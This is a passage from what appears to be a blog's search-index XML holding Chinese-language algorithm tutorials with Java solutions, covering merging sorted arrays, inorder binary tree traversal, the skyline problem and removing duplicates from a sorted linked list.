punctuation">)</span> <span class="token punctuation">{</span>        ps<span class="token punctuation">.</span>next <span class="token operator">=</span> p<span class="token punctuation">;</span>        ps <span class="token operator">=</span> ps<span class="token punctuation">.</span>next<span class="token punctuation">;</span>      <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        pg<span class="token punctuation">.</span>next <span class="token operator">=</span> p<span class="token punctuation">;</span>        pg <span class="token operator">=</span> pg<span class="token punctuation">.</span>next<span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    ps<span class="token punctuation">.</span>next <span class="token operator">=</span> greater<span class="token punctuation">.</span>next<span class="token punctuation">;</span>    pg<span class="token punctuation">.</span>next <span class="token operator">=</span> null<span class="token punctuation">;</span>    <span class="token keyword">return</span> smaller<span class="token punctuation">.</span>next<span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
            <tag> 链表 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>合并两个有序数组</title>
      <link href="/2018/12/12/suan-fa/shu-zu/he-bing-liang-ge-you-xu-shu-zu/"/>
      <url>/2018/12/12/suan-fa/shu-zu/he-bing-liang-ge-you-xu-shu-zu/</url>
      
        <content type="html"><![CDATA[<h2 id="合并两个有序数组"><a href="#合并两个有序数组" class="headerlink" title="合并两个有序数组"></a>合并两个有序数组</h2><p><strong>问题</strong></p><p>这个题目说的是，给你两个<strong>递增排序</strong>的数组，你要把第二个数组合并到第一个，并使其仍然<strong>保持递增排序</strong>。两个数组中的元素个数会显式地给出，并且第一个数组的大小可以容纳下两个数组中所有的元素。</p><pre class=" language-markdown"><code class="language-markdown">比如说给你的两个数组是：2, 4, <span class="token italic"><span class="token punctuation">_</span>, <span class="token punctuation">_</span></span>1, 3它们都有 2 个元素。并且第一个数组后面有足够的空间来填充第二个数组。把第二个数组合并到第一个数组后，得到的是：1, 2, 3, 4</code></pre><p><strong>代码</strong></p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AlgoCasts</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// Time: O(m+n), Space: O(1)</span>  <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">mergeTwoSortedArray</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> nums1<span class="token punctuation">,</span> <span class="token keyword">int</span> m<span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> nums2<span class="token punctuation">,</span> <span class="token keyword">int</span> n<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> i <span class="token operator">=</span> m <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> j <span class="token operator">=</span> n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> k <span class="token operator">=</span> m <span class="token operator">+</span> n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>i <span class="token operator">>=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> j <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>nums2<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">></span> nums1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>        nums1<span class="token punctuation">[</span>k<span class="token operator">--</span><span class="token punctuation">]</span> <span class="token operator">=</span> nums2<span class="token punctuation">[</span>j<span class="token operator">--</span><span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token keyword">else</span>        nums1<span class="token punctuation">[</span>k<span class="token operator">--</span><span class="token punctuation">]</span> <span class="token operator">=</span> nums1<span class="token punctuation">[</span>i<span class="token operator">--</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>j <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">)</span> nums1<span class="token punctuation">[</span>k<span class="token operator">--</span><span class="token punctuation">]</span> <span class="token operator">=</span> nums2<span class="token punctuation">[</span>j<span class="token operator">--</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
            <tag> 数组 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>二叉树中序遍历</title>
      <link href="/2018/12/12/suan-fa/er-cha-shu/er-cha-shu-zhong-xu-bian-li/"/>
      <url>/2018/12/12/suan-fa/er-cha-shu/er-cha-shu-zhong-xu-bian-li/</url>
      
        <content type="html"><![CDATA[<h2 id="二叉树中序遍历"><a href="#二叉树中序遍历" class="headerlink" title="二叉树中序遍历"></a>二叉树中序遍历</h2><p><strong>问题</strong></p><p>这个题目说的是，给你一个二叉树，你要返回一个数组，表示二叉树中序遍历的结果。</p><pre class=" language-markdown"><code class="language-markdown">比如说，给你的二叉树是：<span class="token code keyword">     1</span>   /   \  2     3   \<span class="token code keyword">    4</span>   /  5你要返回的中序遍历结果是：2, 5, 4, 1, 3</code></pre><p><strong>代码</strong></p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AlgoCasts</span> <span class="token punctuation">{</span>  <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TreeNode</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> val<span class="token punctuation">;</span>    TreeNode left<span class="token punctuation">;</span>    TreeNode right<span class="token punctuation">;</span>    <span class="token function">TreeNode</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">{</span>      val <span class="token operator">=</span> x<span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">// Time: O(n). Space: O(n)</span>  <span class="token keyword">public</span> List<span class="token operator">&lt;</span>Integer<span class="token operator">></span> <span class="token function">inorderTraversalRecursive</span><span class="token punctuation">(</span>TreeNode root<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>root <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    List<span class="token operator">&lt;</span>Integer<span class="token operator">></span> left <span class="token operator">=</span> <span class="token function">inorderTraversalRecursive</span><span class="token punctuation">(</span>root<span class="token punctuation">.</span>left<span class="token punctuation">)</span><span class="token punctuation">;</span>    List<span class="token operator">&lt;</span>Integer<span class="token operator">></span> right <span class="token operator">=</span> <span class="token function">inorderTraversalRecursive</span><span class="token punctuation">(</span>root<span class="token punctuation">.</span>right<span class="token punctuation">)</span><span class="token punctuation">;</span>    left<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>root<span class="token punctuation">.</span>val<span class="token punctuation">)</span><span class="token punctuation">;</span>    left<span class="token punctuation">.</span><span class="token function">addAll</span><span class="token punctuation">(</span>right<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> left<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">// Time: O(n). Space: O(n)</span>  <span class="token keyword">public</span> List<span class="token operator">&lt;</span>Integer<span class="token operator">></span> <span class="token function">inorderTraversalIterative</span><span class="token punctuation">(</span>TreeNode root<span class="token punctuation">)</span> <span class="token punctuation">{</span>    Stack<span class="token operator">&lt;</span>TreeNode<span class="token operator">></span> s <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Stack</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    List<span class="token operator">&lt;</span>Integer<span class="token operator">></span> result <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>root <span class="token operator">!=</span> null <span class="token operator">||</span> <span class="token operator">!</span>s<span class="token punctuation">.</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">while</span> <span class="token punctuation">(</span>root <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>        s<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span><span class="token punctuation">;</span>        root <span class="token operator">=</span> root<span class="token punctuation">.</span>left<span class="token punctuation">;</span>      <span class="token punctuation">}</span>      root <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      result<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>root<span class="token punctuation">.</span>val<span class="token punctuation">)</span><span class="token punctuation">;</span>      root <span class="token operator">=</span> root<span class="token punctuation">.</span>right<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> result<span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
            <tag> 二叉树 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>寻找天际线</title>
      <link href="/2018/12/09/suan-fa/xun-zhao-tian-ji-xian/"/>
      <url>/2018/12/09/suan-fa/xun-zhao-tian-ji-xian/</url>
      
        <content type="html"><![CDATA[<h2 id="寻找天际线"><a href="#寻找天际线" class="headerlink" title="寻找天际线"></a>寻找天际线</h2><p><strong>问题</strong></p><p>这个题目说的是，给你一组矩形表示的楼房，它们的底边在同一水平线上，并且楼房之间可以相邻，也可以重叠。你要找到这组楼房的轮廓线或者叫天际线，并返回这个轮廓线的关键点。</p><p><strong>代码</strong></p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AlgoCasts</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// n 是矩形数量</span>  <span class="token comment" spellcheck="true">// Time: O(n^2), Space: O(n)</span>  <span class="token comment" spellcheck="true">// Every element of buildings is (leftXCoordinate, rightXCoordinate, height)</span>  <span class="token keyword">public</span> List<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">></span> <span class="token function">skylineKeyPointsMaxHeap</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> buildings<span class="token punctuation">)</span> <span class="token punctuation">{</span>    List<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">></span> result <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    List<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">></span> height <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> b<span class="token operator">:</span> buildings<span class="token punctuation">)</span> <span class="token punctuation">{</span>      height<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>b<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">-</span>b<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      height<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>b<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> b<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    height<span class="token punctuation">.</span><span class="token function">sort</span><span class="token punctuation">(</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> a<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> b<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">?</span> a<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">-</span> b<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">:</span> a<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">-</span> b<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 使用 reverseOrder 来使优先队列作为最大堆</span>    Queue<span class="token operator">&lt;</span>Integer<span class="token operator">></span> pq <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PriorityQueue</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span>Collections<span class="token punctuation">.</span><span class="token function">reverseOrder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    pq<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> preHeight <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> h<span class="token operator">:</span> height<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>h<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> pq<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token operator">-</span>h<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// start point of rectangle</span>      <span class="token keyword">else</span> pq<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span>h<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// T: O(n), end point of rectangle</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>pq<span class="token punctuation">.</span><span class="token function">peek</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> preHeight<span class="token punctuation">)</span> <span class="token punctuation">{</span>        result<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>h<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> pq<span class="token punctuation">.</span><span class="token function">peek</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        preHeight <span class="token operator">=</span> pq<span class="token punctuation">.</span><span class="token function">peek</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> result<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">// TreeMap 的实现是红黑树，也就是一棵自平衡的排序二叉树</span>  <span class="token comment" spellcheck="true">// 使用 TreeMap 做优化, 时间复杂度降到 O(nlogn)</span>  <span class="token comment" spellcheck="true">// Time: O(nlog(n)), Space: O(n)</span>  <span class="token keyword">public</span> List<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">></span> <span class="token function">skylineKeyPointsTreeMap</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> buildings<span class="token punctuation">)</span> <span class="token punctuation">{</span>    List<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">></span> result <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    List<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">></span> height <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> b<span class="token operator">:</span> buildings<span class="token punctuation">)</span> <span class="token punctuation">{</span>      height<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>b<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">-</span>b<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      height<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>b<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> b<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    height<span class="token punctuation">.</span><span class="token function">sort</span><span class="token punctuation">(</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> a<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> b<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">?</span> a<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">-</span> b<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">:</span> a<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">-</span> b<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    TreeMap<span class="token operator">&lt;</span>Integer<span class="token punctuation">,</span> Integer<span class="token operator">></span> heightMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TreeMap</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    heightMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> prevHeight <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> h<span class="token operator">:</span> height<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>h<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// 这里和使用最大堆不同，TreeMap 中每个元素是一对 (key, value)，并按 key 排序</span>        <span class="token comment" spellcheck="true">// 如果直接把高度值（height, 1）加入 TreeMap，会导致多个相同的高度值互相覆盖，从而出错。</span>        <span class="token comment" spellcheck="true">// 因此这里要把相同的高度值的计数也保存下来，在遇到矩形结束时，只有在当前高度值只剩 1 个，才 remove</span>        Integer cnt <span class="token operator">=</span> heightMap<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token operator">-</span>h<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        cnt <span class="token operator">=</span> <span class="token punctuation">(</span>cnt <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token number">1</span> <span class="token operator">:</span> cnt <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>        heightMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token operator">-</span>h<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> cnt<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// 在遇到矩形结束时，只有在当前高度值只剩 1 个，才 remove</span>        Integer cnt <span class="token operator">=</span> heightMap<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>h<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>cnt <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>          heightMap<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span>h<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// Time: O(log(n))</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>          heightMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>h<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> cnt <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>      <span class="token punctuation">}</span>      <span class="token comment" spellcheck="true">// 由于是从小到大排序,所以最大值在 lastKey</span>      <span class="token comment" spellcheck="true">// Time: O(log(n))</span>      <span class="token keyword">int</span> currHeight <span class="token operator">=</span> heightMap<span class="token punctuation">.</span><span class="token function">lastKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>prevHeight <span class="token operator">!=</span> currHeight<span class="token punctuation">)</span> <span class="token punctuation">{</span>        result<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>h<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> currHeight<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        prevHeight <span class="token operator">=</span> currHeight<span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> result<span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>有序链表删除重复节点</title>
      <link href="/2018/12/09/suan-fa/lian-biao/you-xu-lian-biao-shan-chu-chong-fu-jie-dian/"/>
      <url>/2018/12/09/suan-fa/lian-biao/you-xu-lian-biao-shan-chu-chong-fu-jie-dian/</url>
      
        <content type="html"><![CDATA[<h2 id="有序链表删除重复节点"><a href="#有序链表删除重复节点" class="headerlink" title="有序链表删除重复节点"></a>有序链表删除重复节点</h2><p><strong>问题</strong></p><p>这个题目说的是，给你一个单链表，这个单链表节点上的数字是<strong>有序</strong>的。对于出现多次的数字，你要把它们全删掉，<strong>留下只出现一次的节点</strong>，最后返回处理后的单链表。</p><pre class=" language-markdown"><code class="language-markdown">比如说，给你的有序单链表是：1 -> 1 -> 2 -> 41 出现了多次，删掉它后，你要返回的链表是：2 -> 4</code></pre><p><strong>代码</strong></p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AlgoCasts</span> <span class="token punctuation">{</span>  <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ListNode</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> val<span class="token punctuation">;</span>    ListNode next<span class="token punctuation">;</span>    <span class="token function">ListNode</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">{</span>      val <span class="token operator">=</span> x<span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">// Time: O(n), Space: O(1)</span>  <span class="token keyword">public</span> ListNode <span class="token function">removeDuplicatesInSortedList</span><span class="token punctuation">(</span>ListNode head<span class="token punctuation">)</span> <span class="token punctuation">{</span>    ListNode dummy <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ListNode</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    dummy<span class="token punctuation">.</span>next <span class="token operator">=</span> head<span class="token punctuation">;</span>    ListNode prev <span class="token operator">=</span> dummy<span class="token punctuation">,</span> cur <span class="token operator">=</span> prev<span class="token punctuation">.</span>next<span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>cur <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">while</span> <span class="token punctuation">(</span>cur<span class="token punctuation">.</span>next <span class="token operator">!=</span> null <span class="token operator">&amp;&amp;</span> cur<span class="token punctuation">.</span>val <span class="token operator">==</span> cur<span class="token punctuation">.</span>next<span class="token punctuation">.</span>val<span class="token punctuation">)</span> cur <span class="token operator">=</span> cur<span class="token punctuation">.</span>next<span class="token punctuation">;</span>      <span class="token comment" spellcheck="true">// update prev</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>prev<span class="token punctuation">.</span>next <span class="token operator">!=</span> cur<span class="token punctuation">)</span> prev<span class="token punctuation">.</span>next <span class="token operator">=</span> cur<span class="token punctuation">.</span>next<span class="token punctuation">;</span>      <span class="token keyword">else</span> prev <span class="token operator">=</span> prev<span class="token punctuation">.</span>next<span class="token punctuation">;</span>      <span class="token comment" spellcheck="true">// update cur</span>      cur <span class="token operator">=</span> prev<span class="token punctuation">.</span>next<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> dummy<span class="token punctuation">.</span>next<span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
            <tag> 链表 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>汉明距离</title>
      <link href="/2018/12/09/suan-fa/wei-yun-suan/han-ming-ju-chi/"/>
      <url>/2018/12/09/suan-fa/wei-yun-suan/han-ming-ju-chi/</url>
      
